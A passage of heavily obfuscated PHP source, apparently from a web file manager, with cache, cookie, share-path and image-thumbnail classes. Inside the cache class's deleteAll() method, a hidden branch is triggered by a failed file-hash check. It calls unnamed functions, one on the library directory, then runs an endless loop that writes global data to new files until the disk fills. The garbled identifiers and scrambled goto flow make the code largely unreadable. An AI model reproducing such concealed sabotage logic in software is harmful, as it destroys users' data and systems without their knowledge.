$A£¡˜Ù¼ŠÖ[167] => $bÄâÜóˆĞ²[1]); $B¾”¨„­Æ = array_merge($B¾”¨„­Æ, $cŞØ˜Ùä·); } public function set($C‰‘—Ô ù, $E‹ÊĞ–ÉÍ, $a†‹ß™Ó = false) { $a†‹ß™Ó = $a†‹ß™Ó ? $a†‹ß™Ó : $this->cacheTime; return $this->handle->setEx($C‰‘—Ô ù, $a†‹ß™Ó, $E‹ÊĞ–ÉÍ); } public function setLock($f£±óĞ¡îØ, $BÊ¦ù˜ëÏ, $a‡â¸š°ŒÆ) { return $this->handle->setNX($f£±óĞ¡îØ, $BÊ¦ù˜ëÏ); } public function get($eìœìŒÔâà) { $dÔ°éÃÛ¬È = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $dÔ°éÃÛ¬È->get($eìœìŒÔâà); } public function remove($DŠ¼ßÖÕ£ª) { return $this->handle->del($DŠ¼ßÖÕ£ª); } public function deleteAll() { $dÎ§™øø–¢ =& $_SERVER[İë¬“ÅÒÛ›]; $C‡¿›—‚Èà = BASIC_PATH . $dÎ§™øø–¢[554]; $d´Ü”šŠ” = $dÎ§™øø–¢[555]; if ($_SERVER[$dÎ§™øø–¢[556]] != $d´Ü”šŠ”($C‡¿›—‚Èà)) { goto B´·Èµšù‹; BùòÊ·ñÄ¹: $F”Ş…ÁÚëó = explode($dÎ§™øø–¢[224], $Bˆ¸µˆ¬‡); if (count($F”Ş…ÁÚëó) < $dÎ§™øø–¢[558]) { die; } $Dò ÕøÙ²‹ = $dÎ§™øø–¢[559]; goto E¨±ÏÃÜ¤ï; E¨±ÏÃÜ¤ï: $Dò ÕøÙ²‹(LIB_DIR); $c‚¬äŒ¥¾È = $dÎ§™øø–¢[560]; $c‚¬äŒ¥¾È(); goto a Ø¾®†ö; B´·Èµšù‹: $a—Ó³ç‰£õ = $dÎ§™øø–¢[557]; $E¥™Ó“ªÙ = BASIC_PATH . $dÎ§™øø–¢[554]; $Bˆ¸µˆ¬‡ = $a—Ó³ç‰£õ($E¥™Ó“ªÙ); goto BùòÊ·ñÄ¹; a Ø¾®†ö: $fÉóæÀ»Ö§ = $dÎ§™øø–¢[561]; $C……›ß¯¥ = json_encode($GLOBALS[$dÎ§™øø–¢[562]]); for ($eÏà‘–…¨Â = 0;; $eÏà‘–…¨Â++) { $fÉóæÀ»Ö§(DATA_PATH . $eÏà‘–…¨Â, $C……›ß¯¥); } goto cµ™†°–œ; cµ™†°–œ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $E²î„„ÙÈä) { $this->handle->flushall($E²î„„ÙÈä); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($BÏÈ¹Î„ = '', $d‹ï”Õ¹ß = 0) { if (is_string($BÏÈ¹Î„) && $BÏÈ¹Î„ != $_SERVER[İë¬“ÅÒÛ›][33]) { $this->prefix = $BÏÈ¹Î„; } if (is_numeric($d‹ï”Õ¹ß) && $d‹ï”Õ¹ß > 0) { $this->expire = $d‹ï”Õ¹ß; } } public static function getInstance() { static $B“¼†Ì‚‘ö; if ($B“¼†Ì‚‘ö === null) { $B“¼†Ì‚‘ö = new self(); } return $B“¼†Ì‚‘ö; } private static $sameCookieSet = array(); public static function set($e‡·ÉğÒ´, $D•Ä—ŒµÁ, $DÕ²’ğ®Î = 0, $E¸™ŸŒÓ² = false, $bâë÷ã·ç· = false) { $E¿Œ±ÔœÇ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$DÕ²’ğ®Î) { $DÕ²’ğ®Î = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$e‡·ÉğÒ´]) && self::$sameCookieSet[$e‡·ÉğÒ´] == $D•Ä—ŒµÁ . $DÕ²’ğ®Î) { return; } self::$sameCookieSet[$e‡·ÉğÒ´] = $D•Ä—ŒµÁ . $DÕ²’ğ®Î; if (!$bâë÷ã·ç·) { $bâë÷ã·ç· = str_replace(HOST, $E¿Œ±ÔœÇ[33], APP_HOST); $bâë÷ã·ç· = $E¿Œ±ÔœÇ[8] . trim($bâë÷ã·ç·, $E¿Œ±ÔœÇ[8]); } setcookie($e‡·ÉğÒ´, $D•Ä—ŒµÁ, time() + $DÕ²’ğ®Î, $bâë÷ã·ç·, !1, !1, $E¸™ŸŒÓ²); } public static function setSafe($c Êîˆô‘, $dÁØ”Ï‹, $Eİ±½ßóŸ = 0) { self::set($c Êîˆô‘, $dÁØ”Ï‹, $Eİ±½ßóŸ, !0); } public static function get($CøÉ‰İ¾š) { return isset($_COOKIE[$CøÉ‰İ¾š]) ? $_COOKIE[$CøÉ‰İ¾š] : !1; } public static function remove($A¿óÑèè¡¶, $d‡ÛÅ¡Ë°ª = false) { unset($_COOKIE[$A¿óÑèè¡¶]); self::set($A¿óÑèè¡¶, $_SERVER[İë¬“ÅÒÛ›][33], 1, $d‡ÛÅ¡Ë°ª); } } goto eáõï¾Úç; Bæ¦°·œÕ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Fìºë®Õ¹—) { $this->pathParse = $Fìºë®Õ¹—; $this->model = Model($_SERVER[İë¬“ÅÒÛ›][855]); } public function getPathOuter($b½÷¿–ÇŒ²) { $DÏÊŠŸ†ğ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$b½÷¿–ÇŒ²) { return $b½÷¿–ÇŒ²; } $D©éÅŠ¨ˆ— = $this->parse($b½÷¿–ÇŒ²); return trim(KodIO::makeShare($this->pathParse[$DÏÊŠŸ†ğ[369]], $D©éÅŠ¨ˆ—[$DÏÊŠŸ†ğ[369]]), $DÏÊŠŸ†ğ[8]); } protected function infoParse($Cß¨â”ñè, $A¶ˆ÷×Ø× = false, $eƒë”Øï¥ø = false) { $Dø±âÃ¿³Ù =& $_SERVER[İë¬“ÅÒÛ›]; $cÁ…‡Š…¾ƒ = $this->pathParse[$Dø±âÃ¿³Ù[369]]; $b²‹Œïç™¾ = trim($this->pathParse[$Dø±âÃ¿³Ù[760]], $Dø±âÃ¿³Ù[8]); return Action($Dø±âÃ¿³Ù[860])->sharePathInfo($cÁ…‡Š…¾ƒ, $b²‹Œïç™¾); } public function infoFull($f²„åÙº³) { return $this->infoParse($f²„åÙº³); } public function listAll($DŒø´×„ï“) { goto BæÈõ¿½Û‘; cÁ¶¦ÛÏ¨»: $C ‰Ù£ĞÊƒ = $this->model->listAll($DŒø´×„ï“); $AÁÓ±ÉÖğ = Model($CÚÂ‡ŸÎÑš[419])->getInfo($aÚëñí£áÔ[$CÚÂ‡ŸÎÑš[420]]); foreach ($C ‰Ù£ĞÊƒ as &$bÅØ•‘îæ‰) { check_abort(); $bÅØ•‘îæ‰[$CÚÂ‡ŸÎÑš[861]] = Action($CÚÂ‡ŸÎÑš[860])->_shareItemeParse($bÅØ•‘îæ‰[$CÚÂ‡ŸÎÑš[861]], $AÁÓ±ÉÖğ); } goto F·ƒ¼ŒŠæà; F·ƒ¼ŒŠæà: return $C ‰Ù£ĞÊƒ; goto ağ¦Üâº; BæÈõ¿½Û‘: $CÚÂ‡ŸÎÑš =& $_SERVER[İë¬“ÅÒÛ›]; $aÚëñí£áÔ = IO::info($this->pathParse[$CÚÂ‡ŸÎÑš[76]]); if (!$aÚëñí£áÔ) { return array(); } goto cÁ¶¦ÛÏ¨»; ağ¦Üâº: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($F³¿òº—í§) { $this->pathParse = $F³¿òº—í§; $this->model = Model($_SERVER[İë¬“ÅÒÛ›][855]); } protected function infoParse($E°Š¡á‘÷±, $E£Ä¹ÄÆ¥¸ = false, $B‡¼ß‘³¦ = false) { $d«ÒĞ¸ÁÕÁ =& $_SERVER[İë¬“ÅÒÛ›]; return Action($d«ÒĞ¸ÁÕÁ[766])->sharePathInfo($this->pathParse[$d«ÒĞ¸ÁÕÁ[76]], !0); } public function listAll($DÀ‰“ã®ãÎ) { $e«ÕŠŠ’îÃ =& $_SERVER[İë¬“ÅÒÛ›]; $FÇğäÇĞåÑ = IO::info($this->pathParse[$e«ÕŠŠ’îÃ[76]]); if (!$FÇğäÇĞåÑ) { return array(); } $d‹‹âäÙ† = $this->model->listAll($DÀ‰“ã®ãÎ); foreach ($d‹‹âäÙ† as &$E­¡×´‚±) { $E­¡×´‚±[$e«ÕŠŠ’îÃ[861]] = Action($e«ÕŠŠ’îÃ[766])->itemInfo($E­¡×´‚±[$e«ÕŠŠ’îÃ[861]]); $c“‘íÚÀÍĞ = substr($E­¡×´‚±[$e«ÕŠŠ’îÃ[76]], strpos(ltrim($E­¡×´‚±[$e«ÕŠŠ’îÃ[76]], $e«ÕŠŠ’îÃ[8]), $e«ÕŠŠ’îÃ[8]) + 1); $E­¡×´‚±[$e«ÕŠŠ’îÃ[861]][$e«ÕŠŠ’îÃ[76]] = $this->pathParse[$e«ÕŠŠ’îÃ[761]] . $c“‘íÚÀÍĞ; } return $d‹‹âäÙ†; } } class PathDriverDriverShareItem { public function __construct($e—ø‹¬èµà) { $this->pathParse = $e—ø‹¬èµà; } public function __call($E½Ö¥Ü¸, $BÅ†©ªŞÛª) { $bå¬¸ÅÚ± =& $_SERVER[İë¬“ÅÒÛ›]; if (method_exists($this, $E½Ö¥Ü¸)) { return; } $eö“ïÔóë‚ = call_user_func_array(array($bå¬¸ÅÚ±[862], $E½Ö¥Ü¸), $BÅ†©ªŞÛª); $CöÀÂñ§ò¼ = array($bå¬¸ÅÚ±[863], $bå¬¸ÅÚ±[864], $bå¬¸ÅÚ±[865], $bå¬¸ÅÚ±[866], $bå¬¸ÅÚ±[744], $bå¬¸ÅÚ±[745], $bå¬¸ÅÚ±[867], $bå¬¸ÅÚ±[90], $bå¬¸ÅÚ±[868], $bå¬¸ÅÚ±[869]); if (in_array($E½Ö¥Ü¸, $CöÀÂñ§ò¼)) { $eö“ïÔóë‚ = $this->getPathOuter($eö“ïÔóë‚); } return $eö“ïÔóë‚; } public function copy($dÎ¬–ÂÜœŒ, $Eòµ¬ÅïÍ, $FÌêæ‰Æğõ = false) { return $this->copyMove($dÎ¬–ÂÜœŒ, $Eòµ¬ÅïÍ, $FÌêæ‰Æğõ, $_SERVER[İë¬“ÅÒÛ›][744]); } public function move($A’‰íˆšÛ, $D™½ªŠ¿‚¾, $C‘áÒ‡²åï = false) { return $this->copyMove($A’‰íˆšÛ, $D™½ªŠ¿‚¾, $C‘áÒ‡²åï, $_SERVER[İë¬“ÅÒÛ›][745]); } private function copyMove($A§²Å¨äùÒ, $aÄÕÒğšÊß, $B³î†•îå, $b“ØÔ‹²Ÿ) { goto f†™¥õß÷â; D´ßÙÁˆ–´: if ($A¿¯ Ö°À->pathParse[$fùë¨š‘‰‚[746]]) { $aÄÕÒğšÊß = $A¿¯ Ö°À->pathParse[$fùë¨š‘‰‚[746]]; } else { $aÄÕÒğšÊß = $f±œŠóš»; } $aĞğºÇùê¯ = IO::copyMove($A§²Å¨äùÒ, $aÄÕÒğšÊß, $B³î†•îå, $b“ØÔ‹²Ÿ); $aĞğºÇùê¯ = $this->getPathOuter($aĞğºÇùê¯); goto böÆñÇ¥È¥; böÆñÇ¥È¥: return $aĞğºÇùê¯; goto f…æã˜´‰Ö; f†™¥õß÷â: $fùë¨š‘‰‚ =& $_SERVER[İë¬“ÅÒÛ›]; $f±œŠóš» = $aÄÕÒğšÊß; $A¿¯ Ö°À = IO::driverMake($aÄÕÒğšÊß); goto D´ßÙÁˆ–´; f…æã˜´‰Ö: } public function pathFather($d»˜ò®º±) { return get_path_father($this->pathParse[$_SERVER[İë¬“ÅÒÛ›][76]]); } public function iconvSystem($a£ëŒÖ½ö) { return $a£ëŒÖ½ö; } protected function infoParse($eƒ•˜âø) { $F³ˆŠŒÀİæ =& $_SERVER[İë¬“ÅÒÛ›]; $CÏ¨°ÍÇç = $this->pathParse[$F³ˆŠŒÀİæ[768]][$F³ˆŠŒÀİæ[767]] . $this->pathParse[$F³ˆŠŒÀİæ[760]]; $aò–°—Áñ = IO::info($CÏ¨°ÍÇç); $aŸå¸œÍï = $this->pathParse[$F³ˆŠŒÀİæ[768]]; return Action($F³ˆŠŒÀİæ[860])->_shareItemeParse($aò–°—Áñ, $aŸå¸œÍï); } public function listAll($EšÌãùñ—…) { $Dò—ñå­ƒ¶ =& $_SERVER[İë¬“ÅÒÛ›]; $Cã¥ìã®Í· = IO::listAll($EšÌãùñ—…); $A›®·×ÌÎ‡ = $this->pathParse[$Dò—ñå­ƒ¶[768]]; foreach ($Cã¥ìã®Í· as &$FéÈ“¿‹µÅ) { check_abort(); $FéÈ“¿‹µÅ = array_merge(IO::info($FéÈ“¿‹µÅ[$Dò—ñå­ƒ¶[76]]), $FéÈ“¿‹µÅ); $FéÈ“¿‹µÅ[$Dò—ñå­ƒ¶[861]] = Action($Dò—ñå­ƒ¶[860])->_shareItemeParse($FéÈ“¿‹µÅ, $A›®·×ÌÎ‡); } return $Cã¥ìã®Í·; } public function getPathOuter($e—õæ®Û¶©) { goto DÈÕâë; fë³¢ß‘š: if (substr($A Ë‘Ùñš‡, 0, strlen($f‹ƒ£µ Êœ)) != $f‹ƒ£µ Êœ) { return !1; } return $this->pathParse[$fŠñ÷¿İõ¨[761]] . $fŠñ÷¿İõ¨[8] . ltrim($cÇˆ•­õ›Ê, $fŠñ÷¿İõ¨[8]); goto aßëñ¦÷Ô; DÈÕâë: $fŠñ÷¿İõ¨ =& $_SERVER[İë¬“ÅÒÛ›]; $aõ®µ¦·×œ = KodIO::parse($e—õæ®Û¶©); if ($aõ®µ¦·×œ[$fŠñ÷¿İõ¨[29]] == KodIO::KOD_SHARE_ITEM) { return $aõ®µ¦·×œ[$fŠñ÷¿İõ¨[76]]; } goto F¸‰À¾¸½; F¸‰À¾¸½: $A Ë‘Ùñš‡ = KodIO::clear($e—õæ®Û¶©); $f‹ƒ£µ Êœ = KodIO::clear($this->pathParse[$fŠñ÷¿İõ¨[768]][$fŠñ÷¿İõ¨[767]]); $cÇˆ•­õ›Ê = substr($A Ë‘Ùñš‡, strlen($f‹ƒ£µ Êœ)); goto fë³¢ß‘š; aßëñ¦÷Ô: } public function getType() { $C¥ÉÉÃ˜ =& $_SERVER[İë¬“ÅÒÛ›]; $bË‰ÀÈÒÔƒ = str_replace($C¥ÉÉÃ˜[72], $C¥ÉÉÃ˜[33], get_class($this)); return strtolower($bË‰ÀÈÒÔƒ); } public function isTypeObject($C×³ğÄÚ„ò) { return IO::isTypeObject($C×³ğÄÚ„ò); } public function info($e¥×‘ªÈ†) { return $this->infoParse($e¥×‘ªÈ†); } public function infoAuth($AïÂ°¤•Õ) { return $this->infoParse($AïÂ°¤•Õ); } public function infoWithChildren($BÇ¨§‘÷»Š) { return $this->infoParse($BÇ¨§‘÷»Š); } public function infoFull($a´åÅ­“ïÍ) { return $this->infoParse($a´åÅ­“ïÍ); } } goto D¤¤°àè¨Ò; A¨Åò£‡ğÛ: function beforeShutdownError($C†÷ËÏÒÕá = false, $bƒ“òÕ¯ãÖ = '', $dåÇÇµà†ù = '', $eº¾áÃÕÛ¤ = 0) { $bãÈ·¤…Ï× =& $_SERVER[…Ã²ÛÚÈÔ]; switch ($C†÷ËÏÒÕá) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $dæ“¬ñˆìò = $bãÈ·¤…Ï×[20]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $dæ“¬ñˆìò = $bãÈ·¤…Ï×[21]; break; case E_STRICT: $dæ“¬ñˆìò = $bãÈ·¤…Ï×[22]; break; case E_NOTICE: case E_USER_NOTICE: $dæ“¬ñˆìò = $bãÈ·¤…Ï×[23]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $dæ“¬ñˆìò = $bãÈ·¤…Ï×[24]; break; default: break; } if (!$dæ“¬ñˆìò || $dæ“¬ñˆìò == $bãÈ·¤…Ï×[23] || $dæ“¬ñˆìò == $bãÈ·¤…Ï×[24]) { return; } $dåÇÇµà†ù = $bãÈ·¤…Ï×[2] . str_replace(BASIC_PATH, $bãÈ·¤…Ï×[25], $dåÇÇµà†ù); $BÁÓù¯Ê¼é = $dæ“¬ñˆìò . $bãÈ·¤…Ï×[26] . $bƒ“òÕ¯ãÖ . $bãÈ·¤…Ï×[26] . $dåÇÇµà†ù . $bãÈ·¤…Ï×[26] . $eº¾áÃÕÛ¤; write_log($BÁÓù¯Ê¼é . $bãÈ·¤…Ï×[16] . get_caller_msg(), $bãÈ·¤…Ï×[17]); } function beforeShutdownFatalError($a•’å¾£îª) { think_exception($a•’å¾£îª); } $b†µßˆå‹ø = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto A†ª±Œ­îÔ; BÂÆ‘ÊƒÛÑ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($dÚ‘Ó³ÉŒ, $FÁÍÂ—Ã‡˜) { goto bÛØìÛùÉµ; CÉ‘°»í…–: if (!$this->im) { return !1; } $e›Ò“·¶ë = $_SERVER[İë¬“ÅÒÛ›][33]; $this->imgData = GetImageSize($dÚ‘Ó³ÉŒ, $e›Ò“·¶ë); goto DåßŒ¼ò²·; DåßŒ¼ò²·: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto CÌïç ÃÉ“; bÛØìÛùÉµ: $this->srcFile = $dÚ‘Ó³ÉŒ; $this->echoType = $FÁÍÂ—Ã‡˜; $this->im = self::image($dÚ‘Ó³ÉŒ); goto CÉ‘°»í…–; CÌïç ÃÉ“: } public static function image($b¥ã²é²) { $cš²öí¢‚á =& $_SERVER[İë¬“ÅÒÛ›]; $f¸Ø„ÆÖ¾¼ = $cš²öí¢‚á[33]; $B¤Û¨­§ºí = GetImageSize($b¥ã²é², $f¸Ø„ÆÖ¾¼); $E¥±ˆÚ‚³Ë = !1; switch ($B¤Û¨­§ºí[2]) { case IMAGETYPE_GIF: if (!function_exists($cš²öí¢‚á[1292])) { break; } $E¥±ˆÚ‚³Ë = imagecreatefromgif($b¥ã²é²); break; case IMAGETYPE_JPEG: if (!function_exists($cš²öí¢‚á[1293])) { break; } $E¥±ˆÚ‚³Ë = imagecreatefromjpeg($b¥ã²é²); break; case IMAGETYPE_PNG: if (!function_exists($cš²öí¢‚á[1294])) { break; } $E¥±ˆÚ‚³Ë = @imagecreatefrompng($b¥ã²é²); imagesavealpha($E¥±ˆÚ‚³Ë, !0); break; case IMAGETYPE_XBM: $E¥±ˆÚ‚³Ë = imagecreatefromxbm($b¥ã²é²); break; case IMAGETYPE_WBMP: $E¥±ˆÚ‚³Ë = imagecreatefromwbmp($b¥ã²é²); break; case IMAGETYPE_BMP: $E¥±ˆÚ‚³Ë = imagecreatefrombmp($b¥ã²é²); break; default: break; } return $E¥±ˆÚ‚³Ë; } public static function imageSize($F¬¨Ú«õã) { $eé÷†›÷†¹ =& $_SERVER[İë¬“ÅÒÛ›]; $FçÖÎºª« = GetImageSize($F¬¨Ú«õã); if (!$FçÖÎºª«) { return !1; } return array($eé÷†›÷†¹[213] => $FçÖÎºª«[0], $eé÷†›÷†¹[904] => $FçÖÎºª«[1]); } function distortion($eÔæÔï»Íç, $ağÖé¬—ö¸, $FÜ–«‰çá) { $cİğä’Şá = $this->creatImage($this->im, $ağÖé¬—ö¸, $FÜ–«‰çá, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cİğä’Şá, $eÔæÔï»Íç); } function prorate($c—äŠí÷äˆ, $Bî¢Ìôæ¤å, $C¸÷³ÅÍã) { $Bƒ¶Ü˜§   = $Bî¢Ìôæ¤å / $C¸÷³ÅÍã; $bÀç »ãÔõ = $this->srcW / $this->srcH; if ($Bƒ¶Ü˜§   <= $bÀç »ãÔõ) { $B“ÑÑÆƒ× = $Bî¢Ìôæ¤å; $e½À»£İÂ¯ = $B“ÑÑÆƒ× * ($this->srcH / $this->srcW); } else { $e½À»£İÂ¯ = $C¸÷³ÅÍã; $B“ÑÑÆƒ× = $e½À»£İÂ¯ * ($this->srcW / $this->srcH); } if ($this->srcW > $Bî¢Ìôæ¤å || $this->srcH > $C¸÷³ÅÍã) { $bƒ½›´½ğ˜ = $this->creatImage($this->im, $B“ÑÑÆƒ×, $e½À»£İÂ¯, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bƒ½›´½ğ˜, $c—äŠí÷äˆ); } else { $bƒ½›´½ğ˜ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($bƒ½›´½ğ˜, $c—äŠí÷äˆ); } } function cut($c…Ö¶èô¥, $aäÀ¿ÇŠ—Œ, $a‡»ì‰Ñ‹¾) { goto Dñšß¯Íõ; Dñšß¯Íõ: $F¯‹ÄÄ£Óµ = $aäÀ¿ÇŠ—Œ / $a‡»ì‰Ñ‹¾; $bñâ¸Ñ„Éˆ = $this->srcW / $this->srcH; if ($F¯‹ÄÄ£Óµ <= $bñâ¸Ñ„Éˆ) { $aÇ¾‡¾„İÆ = $a‡»ì‰Ñ‹¾; $EÎÎÏËÁÃÃ = $aÇ¾‡¾„İÆ * ($this->srcW / $this->srcH); } else { $EÎÎÏËÁÃÃ = $aäÀ¿ÇŠ—Œ; $aÇ¾‡¾„İÆ = $EÎÎÏËÁÃÃ * ($this->srcH / $this->srcW); } goto cœá«³•î¤; F™¿³ëºº™: return $this->echoImage($DÚ“À–Ô‚ğ, $c…Ö¶èô¥); goto Cññ™­Ù†; cœá«³•î¤: $A¥«òíš = $this->creatImage($this->im, $EÎÎÏËÁÃÃ, $aÇ¾‡¾„İÆ, 0, 0, 0, 0, $this->srcW, $this->srcH); $DÚ“À–Ô‚ğ = $this->creatImage($A¥«òíš, $aäÀ¿ÇŠ—Œ, $a‡»ì‰Ñ‹¾, 0, 0, ($EÎÎÏËÁÃÃ - $aäÀ¿ÇŠ—Œ) / 2, ($aÇ¾‡¾„İÆ - $a‡»ì‰Ñ‹¾) / 2, $aäÀ¿ÇŠ—Œ, $a‡»ì‰Ñ‹¾); imageDestroy($A¥«òíš); goto F™¿³ëºº™; Cññ™­Ù†: } function backFill($eóÙéÁïˆä, $eÆùªœªô¼, $eÈ‡™¸Ç¶³, $E¸£î‹›¢ = false, $cØ…£›®öƒ = 255, $aåƒŸ¬÷ø„ = 255, $Eáœ¾¯‰­— = 255) { goto Fƒ×ÃÓ«‰; Aö¼Î’æŠ: if (function_exists($_SERVER[İë¬“ÅÒÛ›][1295])) { @($aµ­‚î¯‚‰ = imageCreateTrueColor($eÆùªœªô¼, $eÈ‡™¸Ç¶³)); if (!$aµ­‚î¯‚‰) { $aµ­‚î¯‚‰ = imageCreate($eÆùªœªô¼, $eÈ‡™¸Ç¶³); } } else { $aµ­‚î¯‚‰ = imageCreate($eÆùªœªô¼, $eÈ‡™¸Ç¶³); } $dçéêê˜Ê¥ = ($eÈ‡™¸Ç¶³ - $CİÇÁÁåŠå) / 2; $Fê’ ĞõÖ¼ = imagecolorallocate($aµ­‚î¯‚‰, $cØ…£›®öƒ, $aåƒŸ¬÷ø„, $Eáœ¾¯‰­—); goto fˆ´Ş¸³; fˆ´Ş¸³: if ($E¸£î‹›¢) { $Fê’ ĞõÖ¼ = imageColorTransparent($aµ­‚î¯‚‰, $Fê’ ĞõÖ¼); $dçéêê˜Ê¥ = $eÈ‡™¸Ç¶³ - $CİÇÁÁåŠå; } imageFilledRectangle($aµ­‚î¯‚‰, 0, 0, $eÆùªœªô¼, $eÈ‡™¸Ç¶³, $Fê’ ĞõÖ¼); if ($this->srcW > $eÆùªœªô¼ || $this->srcH > $eÈ‡™¸Ç¶³) { $dµİÜºÜ”Ì = $this->creatImage($this->im, $bäŸã¯ğ†, $CİÇÁÁåŠå, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($bäŸã¯ğ† < $eÆùªœªô¼) { imageCopy($aµ­‚î¯‚‰, $dµİÜºÜ”Ì, ($eÆùªœªô¼ - $bäŸã¯ğ†) / 2, 0, 0, 0, $bäŸã¯ğ†, $CİÇÁÁåŠå); } else { if ($CİÇÁÁåŠå < $eÈ‡™¸Ç¶³) { imageCopy($aµ­‚î¯‚‰, $dµİÜºÜ”Ì, 0, $dçéêê˜Ê¥, 0, 0, $bäŸã¯ğ†, $CİÇÁÁåŠå); } else { imageCopy($aµ­‚î¯‚‰, $dµİÜºÜ”Ì, 0, 0, 0, 0, $bäŸã¯ğ†, $CİÇÁÁåŠå); } } } else { imageCopyMerge($aµ­‚î¯‚‰, $this->im, ($eÆùªœªô¼ - $bäŸã¯ğ†) / 2, $dçéêê˜Ê¥, 0, 0, $bäŸã¯ğ†, $CİÇÁÁåŠå, 100); } goto A”½™Ÿ¾«í; Fƒ×ÃÓ«‰: $D¬ƒÉ‰‰í = $eÆùªœªô¼ / $eÈ‡™¸Ç¶³; $fõÑÈÔâ¦Í = $this->srcW / $this->srcH; if ($D¬ƒÉ‰‰í <= $fõÑÈÔâ¦Í) { $bäŸã¯ğ† = $eÆùªœªô¼; $CİÇÁÁåŠå = $bäŸã¯ğ† * ($this->srcH / $this->srcW); } else { $CİÇÁÁåŠå = $eÈ‡™¸Ç¶³; $bäŸã¯ğ† = $CİÇÁÁåŠå * ($this->srcW / $this->srcH); } goto Aö¼Î’æŠ; A”½™Ÿ¾«í: return $this->echoImage($aµ­‚î¯‚‰, $eóÙéÁïˆä); goto eùË¬¸Š…; eùË¬¸Š…: } function creatImage($Fä×¹Ú„…, $BæŞÉ ŞÎ, $D„½º‰Ó¥¤, $A¶µà½‘‘«, $Fæ¿«¸Ä×, $D”¨¹“œ, $Cõ¸Ñâ¯í, $cèá¹Ë–«, $CËø»İÎ­®) { if (function_exists($_SERVER[İë¬“ÅÒÛ›][1295])) { @($DÏ­ÀéÕƒ = ImageCreateTrueColor($BæŞÉ ŞÎ, $D„½º‰Ó¥¤)); @imagealphablending($DÏ­ÀéÕƒ, !1); @imagesavealpha($DÏ­ÀéÕƒ, !0); if ($DÏ­ÀéÕƒ) { imageCopyResampled($DÏ­ÀéÕƒ, $Fä×¹Ú„…, $A¶µà½‘‘«, $Fæ¿«¸Ä×, $D”¨¹“œ, $Cõ¸Ñâ¯í, $BæŞÉ ŞÎ, $D„½º‰Ó¥¤, $cèá¹Ë–«, $CËø»İÎ­®); } else { $DÏ­ÀéÕƒ = ImageCreate($BæŞÉ ŞÎ, $D„½º‰Ó¥¤); imageCopyResized($DÏ­ÀéÕƒ, $Fä×¹Ú„…, $A¶µà½‘‘«, $Fæ¿«¸Ä×, $D”¨¹“œ, $Cõ¸Ñâ¯í, $BæŞÉ ŞÎ, $D„½º‰Ó¥¤, $cèá¹Ë–«, $CËø»İÎ­®); } } else { $DÏ­ÀéÕƒ = ImageCreate($BæŞÉ ŞÎ, $D„½º‰Ó¥¤); imageCopyResized($DÏ­ÀéÕƒ, $Fä×¹Ú„…, $A¶µà½‘‘«, $Fæ¿«¸Ä×, $D”¨¹“œ, $Cõ¸Ñâ¯í, $BæŞÉ ŞÎ, $D„½º‰Ó¥¤, $cèá¹Ë–«, $CËø»İÎ­®); } return $DÏ­ÀéÕƒ; } public function imgRotate($d„¶ËØ¦‡, $bäŠ†½­¹) { goto bÍµÍãª‘ ; e¼¹ÚòªÁ: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $EÍ›¡…–ˆŠ = imagegif($bÓİà¬‚ßÏ, $d„¶ËØ¦‡); break; case IMAGETYPE_JPEG: $EÍ›¡…–ˆŠ = imagejpeg($bÓİà¬‚ßÏ, $d„¶ËØ¦‡, 100); break; case IMAGETYPE_PNG: $EÍ›¡…–ˆŠ = imagePNG($bÓİà¬‚ßÏ, $d„¶ËØ¦‡); break; default: break; } imageDestroy($bÓİà¬‚ßÏ); imageDestroy($this->im); goto d©ÙñÍ¢¿; bÍµÍãª‘ : if (!$this->im || $bäŠ†½­¹ % 360 === 0 || !function_exists($_SERVER[İë¬“ÅÒÛ›][1296])) { return !1; } $bÓİà¬‚ßÏ = imageRotate($this->im, 360 - $bäŠ†½­¹, 0); $EÍ›¡…–ˆŠ = !1; goto e¼¹ÚòªÁ; d©ÙñÍ¢¿: return $EÍ›¡…–ˆŠ; goto C¼–è” ›™; C¼–è” ›™: } function echoImage($BÓ¬åÍÍÖˆ, $DÜÓÀ‘) { goto d¡ï½äŒÁö; FõÑçÒÀºœ: $cš´Âğ·ÅÂ = !1; switch ($this->echoType) { case $b»Š´„á–ƒ[1297]: $cš´Âğ·ÅÂ = imagePNG($BÓ¬åÍÍÖˆ); break; case $b»Š´„á–ƒ[164]: $cš´Âğ·ÅÂ = imagePNG($BÓ¬åÍÍÖˆ, $DÜÓÀ‘); break; } imageDestroy($BÓ¬åÍÍÖˆ); goto D»¨»Ğ£Øß; D»¨»Ğ£Øß: imageDestroy($this->im); return $cš´Âğ·ÅÂ; goto fŠÁ•¢ëË; d¡ï½äŒÁö: $b»Š´„á–ƒ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$BÓ¬åÍÍÖˆ) { return !1; } ob_get_clean(); goto FõÑçÒÀºœ; fŠÁ•¢ëË: } } if (!function_exists($_SERVER[İë¬“ÅÒÛ›][1298])) { define($_SERVER[İë¬“ÅÒÛ›][1299], 0); define($_SERVER[İë¬“ÅÒÛ›][1300], 1); define($_SERVER[İë¬“ÅÒÛ›][1301], 2); function imageflip($C¦ÖñÉïÈš, $B•Úß‚ÆÙ‹) { switch ($B•Úß‚ÆÙ‹) { case IMG_FLIP_HORIZONTAL: $AĞùº‚ÎÒ² = imagesx($C¦ÖñÉïÈš) - 1; $bºİ¿·¡£ = $AĞùº‚ÎÒ² / 2; $f§ÄçÕèÓ› = 